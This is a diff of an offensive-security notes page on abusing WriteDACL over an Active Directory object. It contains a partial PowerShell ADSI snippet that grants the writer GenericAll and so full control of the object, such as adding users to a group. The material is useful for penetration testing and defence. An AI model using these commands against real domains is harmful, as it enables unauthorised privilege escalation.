@@ -201,7 +201,7 @@ If you have `WriteDACL` on an AD object you're the owner of, like I'm the owner 
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-10-19-07-16.png)
 
-You can now give yourself `GenericAll` privileges with ADSI sorcery:
+You can now give yourself [`GenericAll`](abusing-active-directory-acls-aces.md#genericall-on-group) privileges with a sprinkle of ADSI sorcery:
 
 ```csharp
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
@@ -211,9 +211,9 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
 
-![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-49.png)
+Which means you fully control the AD object now - and for example can add a new users to the group if the AD object is a group:
 
-Which means you fully control the AD object now.
+![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-49.png)
 
 Interesting, but I could not make it work using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
 
